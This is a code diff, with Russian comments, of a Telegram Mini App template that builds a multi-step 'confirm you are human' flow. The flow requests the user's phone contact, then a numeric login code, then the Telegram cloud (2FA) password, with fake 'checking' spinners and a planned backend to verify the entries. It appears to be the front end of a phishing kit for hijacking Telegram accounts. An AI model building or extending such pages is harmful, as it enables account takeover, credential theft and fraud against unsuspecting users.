@@ -7,40 +7,129 @@
   <script async src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root { color-scheme: dark; }
+    *, *::before, *::after { box-sizing: border-box; }
     /* По умолчанию — чистый чёрный экран без контента (пока идёт проверка
        доступа / редирект). Тема и фон применяются только после granted. */
     html, body {
-      margin: 0; padding: 0; height: 100%;
+      margin: 0; padding: 0;
+      min-height: 100%;
       background: #000;
       color: #fff;
       font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+      -webkit-text-size-adjust: 100%;
+      overflow-x: hidden;
     }
     #bg {
-      position: fixed; inset: 0; z-index: -1;
+      position: fixed; inset: 0; z-index: 0;   /* НЕ -1: иначе фон body перекрывает */
       background-size: cover; background-position: center;
     }
+    #apphead {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 2;
+      text-align: center; pointer-events: none;
+      padding: calc(10px + env(safe-area-inset-top)) 14px 10px;
+      font-size: 14px; font-weight: 600; letter-spacing: .2px; opacity: .85;
+      text-shadow: 0 1px 4px rgba(0,0,0,.5);
+    }
     #root {
-      position: relative;
-      min-height: 100%;
+      position: relative; z-index: 1;           /* контент над слоем фона */
+      min-height: 100vh;            /* фолбэк для старых вебвью */
+      min-height: 100dvh;           /* реальная высота экрана телефона */
       display: flex; flex-direction: column;
       align-items: center; justify-content: center;
-      text-align: center; padding: 24px; box-sizing: border-box;
+      text-align: center;
+      /* отступы + безопасные зоны (вырез/закругления телефонов) */
+      padding: calc(24px + env(safe-area-inset-top)) 20px
+               calc(24px + env(safe-area-inset-bottom)) 20px;
     }
-    .card { max-width: 420px; }
-    h2 { margin: 0 0 12px; font-size: 22px; }
-    p { margin: 6px 0; opacity: .85; line-height: 1.4; }
-    .muted { font-size: 13px; opacity: .6; }
+    .card { width: 100%; max-width: 380px; margin: auto 0; }
+    h2 { margin: 0 0 12px; font-size: clamp(20px, 6vw, 24px); }
+    p { margin: 6px 0; opacity: .85; line-height: 1.45; }
+    .muted { font-size: clamp(12px, 3.6vw, 14px); opacity: .6; }
+    .emoji { font-size: clamp(44px, 16vw, 68px); line-height: 1; margin-bottom: 16px; }
+    .text {
+      font-size: clamp(15px, 4.3vw, 18px); line-height: 1.5;
+      margin-bottom: 22px; overflow-wrap: anywhere;
+    }
+    .btn {
+      display: block; width: 100%; max-width: 340px; margin: 4px auto 0;
+      border: none; cursor: pointer; -webkit-appearance: none;
+      padding: 15px 24px; border-radius: 14px; font-size: 16px; font-weight: 600;
+      color: #fff; background: var(--tg-theme-button-color, #2ea6ff);
+    }
+    .inp {
+      display: block; width: 100%; max-width: 340px;
+      margin: 0 auto 14px; padding: 14px 16px; border-radius: 14px;
+      border: 1px solid rgba(127,127,127,.35);
+      background: rgba(127,127,127,.12); color: #fff;
+      font-size: 16px;            /* >=16px — iOS не зумит при фокусе */
+      text-align: center; outline: none;
+    }
+    .step { font-size: 12px; opacity: .4; margin-top: 18px; }
+
+    /* ============ виды (скины вёрстки страниц) ============ */
+    /* classic — центр, без панели (база) */
+
+    /* card — ПЛОТНАЯ тёмная карточка: фон сквозь неё почти не виден */
+    #root.view-card .card {
+      background: rgba(15,17,23,.95);
+      border: 1px solid rgba(255,255,255,.06);
+      border-radius: 18px; padding: 38px 24px;
+      box-shadow: 0 22px 60px rgba(0,0,0,.6);
+    }
+    /* glass — ПРОЗРАЧНОЕ матовое стекло: фон чётко просвечивает и размыт */
+    #root.view-glass .card {
+      background: rgba(255,255,255,.08);
+      border: 1.5px solid rgba(255,255,255,.45);
+      border-radius: 34px; padding: 38px 24px;
+      -webkit-backdrop-filter: blur(24px) saturate(180%);
+      backdrop-filter: blur(24px) saturate(180%);
+      box-shadow: inset 0 1px 0 rgba(255,255,255,.25),
+                  0 22px 60px rgba(0,0,0,.3);
+    }
+    /* minimal — влево, сверху, крупный заголовок, контурная кнопка */
+    #root.view-minimal { justify-content: flex-start; text-align: left; }
+    #root.view-minimal .card { margin: 10vh 0 0; max-width: 460px; }
+    #root.view-minimal .emoji { font-size: clamp(28px,8vw,38px); margin-bottom: 8px; }
+    #root.view-minimal .text {
+      font-size: clamp(21px,6.2vw,28px); font-weight: 700; line-height: 1.3;
+    }
+    #root.view-minimal .inp { margin-left: 0; text-align: left; }
+    #root.view-minimal .btn {
+      margin-left: 0; background: transparent;
+      border: 2px solid var(--tg-theme-button-color, #2ea6ff);
+      color: #fff; border-radius: 12px;
+    }
+    /* bottom — контент сверху, крупная кнопка фиксирована у низа экрана */
+    #root.view-bottom { justify-content: flex-start; padding-bottom: 104px; }
+    #root.view-bottom .card { margin: 8vh 0 0; }
+    #root.view-bottom .emoji { font-size: clamp(64px,23vw,104px); }
+    #root.view-bottom .text { font-size: clamp(17px,5vw,21px); }
+    #root.view-bottom .btn {
+      position: fixed; left: 16px; right: 16px; width: auto; max-width: none;
+      bottom: calc(16px + env(safe-area-inset-bottom)); margin: 0;
+      padding: 18px; font-size: 18px; border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.45);
+    }
     .spinner {
-      width: 28px; height: 28px; border-radius: 50%;
-      border: 3px solid rgba(127,127,127,.3);
+      width: 52px; height: 52px; border-radius: 50%;
+      border: 5px solid rgba(127,127,127,.25);
       border-top-color: var(--tg-theme-button-color, #2ea6ff);
-      animation: spin .8s linear infinite; margin: 0 auto 16px;
+      animation: spin .9s linear infinite; margin: 0 auto 18px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-label { font-size: 16px; opacity: .85; }
+    .loading-dots::after {
+      content: ""; animation: dots 1.2s steps(4, end) infinite;
+    }
+    @keyframes dots {
+      0% { content: ""; } 25% { content: "."; }
+      50% { content: ".."; } 75% { content: "..."; }
+    }
   </style>
 </head>
 <body>
   <div id="bg"></div>
+  <div id="apphead"></div>
   <div id="root"></div>
 
   <script>
@@ -74,32 +163,147 @@
 
     function html(s) { root.innerHTML = '<div class="card">' + s + '</div>'; }
 
+    function resolveBg(v) {
+      if (!v) return "";
+      if (v.indexOf("gradient(") !== -1) return v;       // CSS-градиент
+      if (v.indexOf("url(") === 0) return v;              // готовый url(...)
+      if (/^https?:\/\//i.test(v)) return "url('" + v + "')"; // свой фон (URL)
+      return "";
+    }
+
     function applyTheme() {
+      // вид (вёрстка) — класс на корне
+      root.className = "view-" + (CFG.view || "classic");
+      // название приложения под шаблон — в шапке мини-аппа и в title
+      if (CFG.title) {
+        document.title = CFG.title;
+        var ah = document.getElementById("apphead");
+        if (ah) ah.textContent = CFG.title;
+      }
       if (CFG.color) {
         document.documentElement.style.setProperty(
           "--tg-theme-button-color", CFG.color
         );
       }
-      if (CFG.bg) {
-        const bg = document.getElementById("bg");
-        bg.style.backgroundImage = "url('" + CFG.bg + "')";
+      var css = resolveBg(CFG.bg);
+      if (css) {
+        var bg = document.getElementById("bg");
+        bg.style.backgroundImage = css;
         bg.style.filter = "blur(" + (CFG.blur || 0) + "px)";
         if (CFG.blur) bg.style.transform = "scale(1.1)";
       }
+    }
+
+    // ----- многошаговый прогон страниц шаблона (фронт; бекенд позже) -----
+    var PAGES = CFG.pages || [];
+    var step = 0;
+
+    function esc(s) {
+      return (s == null ? "" : String(s))
+        .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    function renderStep(i) {
+      var p = PAGES[i];
+      if (!p) return;
+      var out = "";
+      if (p.emoji) out += '<div class="emoji">' + p.emoji + "</div>";
+      // text/hint хранятся как HTML-разметка шаблона — выводим как есть
+      if (p.text) out += '<div class="text">' + p.text + "</div>";
+      // поле ввода для страниц «код» и «2FA»
+      if (p.key === "code") {
+        // p.wrong («Вы ввели неверный код») сюда НЕ выводим — он остаётся в
+        // конфиге и показывается бекенд-логикой только при неверном вводе.
+        out += '<input class="inp" id="inp" inputmode="numeric" '
+             + 'placeholder="• • • • •" />';
+      } else if (p.key === "twofa") {
+        out += '<input class="inp" id="inp" type="password" placeholder="'
+             + esc(p.placeholder) + '" />';
+        if (p.hint) out += '<p class="muted">' + p.hint + "</p>";
+      }
+      var last = i >= PAGES.length - 1;
+      var label = p.button || (last ? "Готово" : "Далее");
+      out += '<button class="btn" id="act">' + esc(label) + "</button>";
+      out += '<div class="step">' + (i + 1) + " / " + PAGES.length + "</div>";
+      html(out);
+      // после смены страницы возвращаем экран в начало — иначе вёрстка
+      // «уезжает» и приходится прокручивать вручную
+      window.scrollTo(0, 0);
+      var tg = tgApp();
+      if (tg) { try { tg.expand(); } catch (e) {} }
+      var act = document.getElementById("act");
+      if (act) {
+        // На главной странице («подтвердите, что вы человек») кнопка сначала
+        // просит поделиться номером телефона, и только после согласия ведёт
+        // дальше. Бот получит контакт серверно (под бекенд-логику).
+        act.onclick = (p.key === "main") ? requestPhone : nextStep;
+      }
+    }
+
+    function requestPhone() {
+      var tg = tgApp();
+      if (tg && typeof tg.requestContact === "function") {
+        try {
+          tg.requestContact(function (ok, evt) {
+            var shared = ok === true || (evt && evt.status === "sent");
+            if (shared) nextStep();           // согласился — идём дальше
+          });
+          return;
+        } catch (e) {}
+      }
+      // старый Telegram / вне Telegram — просто переходим (для теста вёрстки)
+      nextStep();
+    }
+
+    // Анимации загрузки между страницами. Ключ — страница, С КОТОРОЙ уходим:
+    // подпись описывает, что именно «проверяется». После «поделиться
+    // номером» (уход со страницы main) анимации нет. Сейчас длительность —
+    // заглушка-таймаут; в боевом флоу держите спиннер до ответа бекенда
+    // (замените setTimeout на fetch/опрос статуса проверки).
+    var LOADING = {
+      code:  { label: "Проверяем код",            ms: 2200 },
+      twofa: { label: "Проверяем облачный пароль", ms: 2200 }
+    };
+
+    function showLoading(label) {
+      var l = label
+        ? '<div class="loading-label loading-dots">' + esc(label) + "</div>"
+        : "";
+      html('<div class="spinner"></div>' + l);
+      window.scrollTo(0, 0);
+    }
+
+    function goTo(i) {
+      step = i;
+      renderStep(step);
+    }
+
+    function nextStep() {
+      if (step >= PAGES.length - 1) {
+        var tg = tgApp();
+        if (tg && tg.close) tg.close();
+        return;
+      }
+      var leaving = PAGES[step].key;
+      var nextIdx = step + 1;
+      var anim = LOADING[leaving];
+      if (!anim) {            // напр. main (после номера) — без анимации
+        goTo(nextIdx);
+        return;
+      }
+      showLoading(anim.label);
+      // TODO(бекенд): вместо таймера дождаться ответа проверки кода/пароля
+      setTimeout(function () { goTo(nextIdx); }, anim.ms);
     }
 
     function renderGranted() {
       whenTgReady(function (tg) {
         if (tg) { tg.ready(); try { tg.expand(); } catch (e) {} }
         applyTheme();
-        if (CFG.main && CFG.main.trim()) { html(CFG.main); return; }
-        const u = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) || {};
-        const name = u.first_name ? (" " + u.first_name) : "";
-        html(
-          '<h2>Доступ открыт ✅</h2>' +
-          '<p>Привет' + name + '!</p>' +
-          '<p>Здесь будет ваш шаблон мини-аппа.</p>'
-        );
+        if (!PAGES.length) { html('<h2>Доступ открыт ✅</h2>'); return; }
+        step = 0;
+        renderStep(step);
       });
     }
 
